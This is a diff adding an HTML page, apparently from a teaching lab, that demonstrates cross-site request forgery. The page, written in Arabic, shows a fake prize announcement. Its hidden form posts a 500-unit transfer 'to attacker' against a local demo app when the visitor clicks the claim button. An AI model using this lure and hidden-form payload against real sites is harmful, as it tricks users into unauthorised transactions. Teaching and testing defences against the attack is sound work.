@@ -1,0 +1,13 @@
+<!doctype html>
+<html lang="ar" dir="rtl">
+<head><meta charset="utf-8"><title>🎁 مبروك! كسبت جايزة</title></head>
+<body>
+  <h1>🎁 مبروك! اضغط لاستلام الجايزة</h1>
+  <!-- ⚠️ صفحة تعليمية: فورم مخفي بيبعت POST لموقع الضحية بكوكيز الضحية -->
+  <form id="evil" method="POST" action="http://localhost:3005/transfer">
+    <input type="hidden" name="to" value="attacker" />
+    <input type="hidden" name="amount" value="500" />
+  </form>
+  <button onclick="document.getElementById('evil').submit()">استلم الجايزة</button>
+</body>
+</html>
